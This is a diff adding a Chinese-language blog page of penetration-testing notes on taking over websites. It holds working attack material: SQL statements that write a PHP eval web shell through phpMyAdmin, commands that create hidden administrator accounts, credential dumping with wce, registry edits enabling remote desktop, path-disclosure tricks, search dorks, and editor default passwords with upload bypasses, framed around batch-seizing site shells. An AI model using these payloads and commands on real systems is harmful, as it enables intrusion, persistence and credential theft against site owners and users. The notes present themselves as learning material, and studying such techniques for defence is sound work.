@@ -1,0 +1,1214 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="龙龙的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Struct2 漏洞和PHP admin批量拿网站shell Struct2 是apache项目下的一个web框架 phpmyadmin是一个以php为基础，以web-base方式架构在网站主机上的mysql的数据库管理工具，让管理者可以用web接口管理mysql数据库 ——弱口令批量拿shell Struct2url：.index.action结尾的struct2框架，用Struts2Scan.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web实战渗透测试&#x2F;web实战渗透测试">
+<meta property="og:url" content="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="龙龙的博客">
+<meta property="og:description" content="Struct2 漏洞和PHP admin批量拿网站shell Struct2 是apache项目下的一个web框架 phpmyadmin是一个以php为基础，以web-base方式架构在网站主机上的mysql的数据库管理工具，让管理者可以用web接口管理mysql数据库 ——弱口令批量拿shell Struct2url：.index.action结尾的struct2框架，用Struts2Scan.">
+<meta property="og:image" content="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109135815926.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109142446318.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109154946299.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109173624058.png">
+<meta property="article:published_time" content="2020-11-07T13:30:48.310Z">
+<meta property="article:modified_time" content="2020-11-16T11:15:06.519Z">
+<meta property="article:author" content="Virusday">
+<meta property="article:tag" content="Learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109135815926.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://virusday.github.io/2020/11/07/web实战渗透测试/web实战渗透测试/"/>
+
+
+
+
+
+  <title>web实战渗透测试/web实战渗透测试 | 龙龙的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">龙龙的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做些有意思的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://virusday.github.io/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Virusday">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="龙龙的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">web实战渗透测试/web实战渗透测试</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-07T21:30:48+08:00">
+                2020-11-07
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-16T19:15:06+08:00">
+                2020-11-16
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Struct2-漏洞和PHP-admin批量拿网站shell"><a href="#Struct2-漏洞和PHP-admin批量拿网站shell" class="headerlink" title="Struct2 漏洞和PHP admin批量拿网站shell"></a>Struct2 漏洞和PHP admin批量拿网站shell</h2><p> Struct2 是apache项目下的一个web框架</p>
+<p>phpmyadmin是一个以php为基础，以web-base方式架构在网站主机上的mysql的数据库管理工具，让管理者可以用web接口管理mysql数据库 ——弱口令批量拿shell</p>
+<h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p>url：.index.action结尾的struct2框架，用Struts2Scan.py 扫目标是否具有该漏洞。</p>
+<p>详见另一篇strust2漏洞复现</p>
+<h3 id="windows命令行"><a href="#windows命令行" class="headerlink" title="windows命令行"></a>windows命令行</h3><h4 id="1-1-用户账户与组账户"><a href="#1-1-用户账户与组账户" class="headerlink" title="1.1 用户账户与组账户"></a>1.1 用户账户与组账户</h4><p>用户帐户是对计算机用户<strong>身份的标识</strong>，本地用户帐户、密码存在本地计算机上，只对本机有效，存储在本地<strong>安全帐户数据库 SAM</strong> 中。</p>
+<p>​    文件路径：<strong>C:\Windows\System32\config\SAM</strong> ，对应的进程：lsass.exe 。通过本地用户和组，可以<strong>为用户和组分配权利和权限</strong>，从而限制用户和组执行某些操作的能力。</p>
+<ul>
+<li>不同的用户身份拥有不同的权限</li>
+<li>每个用户包含一个名称和一个密码</li>
+<li>用户帐户拥有<strong>唯一的安全标识符</strong>(Security Identifier，SID)</li>
+</ul>
+<p>当我们去进程管理里面杀死 lsass.exe 进程时，windows会提示遇到错误，然后关机</p>
+<h4 id="1-2-Windows-默认账户"><a href="#1-2-Windows-默认账户" class="headerlink" title="1.2 Windows 默认账户"></a>1.2 Windows 默认账户</h4><p>Windows 默认账户，用于特殊用途，一般不需更修改其权限</p>
+<ul>
+<li>与使用者关联的用户帐户 Administrator（管理员用户）</li>
+<li>默认的管理员用户 Guest（来宾用户） 默认是禁用的</li>
+</ul>
+<h4 id="1-3-Windows-内置用户账户"><a href="#1-3-Windows-内置用户账户" class="headerlink" title="1.3 Windows 内置用户账户"></a>1.3 Windows 内置用户账户</h4><p>权限：System &gt; Administrator &gt; User &gt; Guest</p>
+<p>与windows组件关联的用户账户：</p>
+<ul>
+<li>System (本地系统)：为<strong>windows的核心组件</strong>访问文件等资源提供权限</li>
+<li>Local Service (本地服务)：预设的<strong>拥有最小权限</strong>的本地账户</li>
+<li>Network Service (网络服务)：具有运行<strong>网络服务权限</strong>的计算机账户</li>
+</ul>
+<h4 id="1-4-查看用户的sid"><a href="#1-4-查看用户的sid" class="headerlink" title="1.4 查看用户的sid"></a>1.4 查看用户的sid</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user    查看当前用户</span><br><span class="line">whoami /user     查看系统当前用户的SID</span><br><span class="line">wmic useraccount get name,sid      查看所有用户的SID</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-查看、创建和删除账户"><a href="#1-5-查看、创建和删除账户" class="headerlink" title="1.5 查看、创建和删除账户"></a>1.5 查看、创建和删除账户</h4><p>使用命令查看、创建和删除账户(管理员权限，否则错误5 拒绝访问)：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Copynet  user　　   查看系统账户</span><br><span class="line">net  user  v1rus    <span class="number">123</span>  /add        创建新用户xie，密码设置为 <span class="number">123</span></span><br><span class="line">net  user  hack<span class="variable">$</span>  <span class="number">123</span>  /add        创建隐藏用户hack，密码为<span class="number">123</span></span><br><span class="line">net  user  v1rus        查看账户xie的属性</span><br><span class="line">net  user  v1rus  v1rus.    将用户写的密码修改为x456.</span><br><span class="line">net  user  v1rus  /del    删除用户xie</span><br><span class="line">net  localgroup   administrators  v1rus    /add      将普通用户xie提权到管理员</span><br><span class="line">net  localgroup   administrators  v1rus<span class="variable">$</span>  /add      将隐藏用户hack提权到管理员</span><br><span class="line">net localgroup users 查看user用户组的成员，包括隐藏成员</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/-mo-/p/11890837.html" target="_blank" rel="noopener">参考这篇连接</a></p>
+<h3 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h3><p>是一个以PHP为基础，以Web-Bas方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p>
+<p>主要是弱口令批量拿shell</p>
+<p><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpadmin 弱口令空密码getshell 常见姿势</a></p>
+<h4 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h4><p>简单总结一下：</p>
+<h5 id="1、select-into-outfile写shell（但是要知道网站的绝对路径），select-basedir-mysql的绝对路径。【低于5-0？】"><a href="#1、select-into-outfile写shell（但是要知道网站的绝对路径），select-basedir-mysql的绝对路径。【低于5-0？】" class="headerlink" title="1、select into outfile写shell（但是要知道网站的绝对路径），select @@basedir mysql的绝对路径。【低于5.0？】"></a>1、select into outfile写shell（但是要知道网站的绝对路径），select @@basedir mysql的绝对路径。【低于5.0？】</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;wamp64&#x2F;www&#x2F;ma.php&#39;)</span><br><span class="line">select &#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;C:&#x2F;wamp64&#x2F;www&#x2F;ma.php&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>但是：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br><strong>并且这个值是只读变量，只能通过配置文件修改。</strong></p>
+<h5 id="2、利用日志写shell（mysql-gt-5-0）"><a href="#2、利用日志写shell（mysql-gt-5-0）" class="headerlink" title="2、利用日志写shell（mysql&gt;=5.0）"></a>2、利用日志写shell（mysql&gt;=5.0）</h5><p>mysql5.0会创建日志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;wamp64&#x2F;www&#x2F;ma.php&#39;;</span><br><span class="line">select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>但是如果服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限，也无法写入shell</p>
+<p>并且解析。</p>
+<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><h5 id="3、获取管理员密码"><a href="#3、获取管理员密码" class="headerlink" title="3、获取管理员密码"></a>3、获取管理员密码</h5><p>1、wce抓取</p>
+<p>管理员启动的mysql服务那么getshell直接就是管理员权限，如果是其他用户则需要提权。<br>wce，pwdump，mimikatz等工具都能抓取密码。上传wce.exe</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wce -w 明文</span><br><span class="line">wce -l 密文</span><br></pre></td></tr></table></figure>
+
+<p>拿到hash值后就可以用<strong>hashcat</strong>或者直接跑<strong>彩虹表</strong>来获取密码。在线也有<a href="https://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">ophcrack</a>可以破解。</p>
+<p>2、3389连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure>
+
+<p>Windows7这类非服务器的系统上远程登录的话会挤掉当前用户，用户掉线马上就知道出事了。当然也可以使用工具让其支持多用户登录</p>
+<h5 id="4、php爆绝对路径"><a href="#4、php爆绝对路径" class="headerlink" title="4、php爆绝对路径"></a>4、php爆绝对路径</h5><p><strong>单引号爆路径</strong></p>
+<p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br><code>www.xxx.com/news.php?id=1′</code></p>
+<p><strong>错误参数值爆路径</strong></p>
+<p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><code>www.xxx.com/researcharchive.php?id=-1</code></p>
+<p><strong>Google爆路径</strong></p>
+<p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xxx.edu.tw warning</span><br><span class="line">Site:xxx.com.tw “fatal error”</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试文件爆路径</strong></p>
+<p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com&#x2F;test.php</span><br><span class="line">www.xxx.com&#x2F;ceshi.php</span><br><span class="line">www.xxx.com&#x2F;info.php</span><br><span class="line">www.xxx.com&#x2F;phpinfo.php</span><br><span class="line">www.xxx.com&#x2F;php_info.php</span><br><span class="line">www.xxx.com&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>phpmyadmin爆路径</strong></p>
+<p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</span><br><span class="line">&#x2F;phpMyAdmin&#x2F;index.php?lang[]&#x3D;1</span><br><span class="line">&#x2F;phpMyAdmin&#x2F;phpinfo.php</span><br><span class="line">load_file()</span><br><span class="line">&#x2F;phpmyadmin&#x2F;themes&#x2F;darkblue_orange&#x2F;layout.inc.php</span><br><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;select_lang.lib.php</span><br><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</span><br><span class="line">&#x2F;phpmyadmin&#x2F;libraries&#x2F;mcrypt.lib.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置文件找路径</strong></p>
+<p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">&#x2F;etc&#x2F;php.ini php配置文件</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf Apache配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf 虚拟目录配置文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>nginx文件类型错误解析爆路径</strong></p>
+<p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p>
+<h2 id="web渗透框架（N种漏洞经验）"><a href="#web渗透框架（N种漏洞经验）" class="headerlink" title="web渗透框架（N种漏洞经验）"></a>web渗透框架（N种漏洞经验）</h2><p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109135815926.png" alt="image-20201109135815926"></p>
+<p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109142446318.png" alt="image-20201109142446318"></p>
+<p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109154946299.png" alt="image-20201109154946299"></p>
+<h2 id="比较常见的编辑器漏洞"><a href="#比较常见的编辑器漏洞" class="headerlink" title="比较常见的编辑器漏洞"></a>比较常见的编辑器漏洞</h2><p>eWebEditor基于浏览器的在线HTML编辑器</p>
+<p>ewebeditornet</p>
+<p>fckeditornet</p>
+<p>editor</p>
+<p>southideditor</p>
+<p>SouthidcEditor</p>
+<p>bigcneditor</p>
+<h3 id="编辑器默认的后台登录"><a href="#编辑器默认的后台登录" class="headerlink" title="编辑器默认的后台登录"></a>编辑器默认的后台登录</h3><p>Editor/admin/asp/upload.asp<br> Editor/admin_login.asp<br> ewebeditor/admin_login.asp<br> admin/Editor/admin_login.asp<br> admin/ewebeditor/admin_login.asp</p>
+<h4 id="1、关键文件的名称和路径"><a href="#1、关键文件的名称和路径" class="headerlink" title="1、关键文件的名称和路径"></a>1、关键文件的名称和路径</h4><p>Admin_Login.asp 登录页面<br>Admin_Default.asp 管理首页<br>Admin_Style.asp<br>Admin_UploadFile.asp<br>Upload.asp<br>Admin_ModiPwd.asp<br>eWebEditor.asp<br>db/ewebeditor.mdb 默认数据库路径 默认用户名admin，密码admin，admin888</p>
+<p><img src="/2020/11/07/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/.%5Cimage-20201109173624058.png" alt="image-20201109173624058"></p>
+<p>注：添加图片类型这里，会出错，如果直接是asp|aspx|cer 上传文件会出错，也不能解析，要上传aaspsp|aspx|cer ,这样就可以解析</p>
+<p>添加工具栏——按钮设置——添加或者修改图片</p>
+<h4 id="2、ewebeditor编辑器一般默认数据库路径是db-ewebeditor-mdb"><a href="#2、ewebeditor编辑器一般默认数据库路径是db-ewebeditor-mdb" class="headerlink" title="2、ewebeditor编辑器一般默认数据库路径是db/ewebeditor.mdb"></a>2、ewebeditor编辑器一般默认数据库路径是db/ewebeditor.mdb</h4><p>默认的后台路径是admin_login.asp<br>建议最好检测下admin_style.asp文件是否可以直接访问</p>
+<h2 id="IIS-put漏洞拿shell"><a href="#IIS-put漏洞拿shell" class="headerlink" title="IIS put漏洞拿shell"></a>IIS put漏洞拿shell</h2><p>1、查看options包，获取允许的权限</p>
+<p>2、put文件</p>
+<p>3、修改文件名（用mov或者是copy改成sap后缀）</p>
+<p>IS 6.0 PUT上传漏洞。产生原因是IIS Server在Web服务扩展中开启了WebDAV。并且管理员在配置权限时，没有遵循最小原则。给IIS配置了可以写入的权限，包括网站根目录。</p>
+<p>总结一下IIS的漏洞：<br>1、PUT漏洞（6.0webdav）</p>
+<p>2、远程代码执行(CVE-2017-7269) （6.0webdav）</p>
+<p>3、解析漏洞（6.0-7.5）【在<code>.asp</code>目录下的任意文件会以<code>asp</code>格式解析】</p>
+<p>4、短文件名爆破【主要是为兼容16位ms-dos，较长文件名或者文件夹生成windows8.3短文件名。HTTP请求中旧DOS 8.3名称约定的代字符（<del>），由于短文件名的长度固定（xxxxxx</del>xxxx），~后面的数字递增】</p>
+<p><a href="https://xz.aliyun.com/t/6783" target="_blank" rel="noopener">iis漏洞总结</a></p>
+<p><a href="https://www.jianshu.com/p/4380e5719ed6" target="_blank" rel="noopener">iis短文件名泄露</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/06/test/" rel="next" title="test">
+                <i class="fa fa-chevron-left"></i> test
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/11/09/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/strust2%20vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="strust2 vulhub漏洞复现/strust2 vulhub漏洞复现">
+                strust2 vulhub漏洞复现/strust2 vulhub漏洞复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
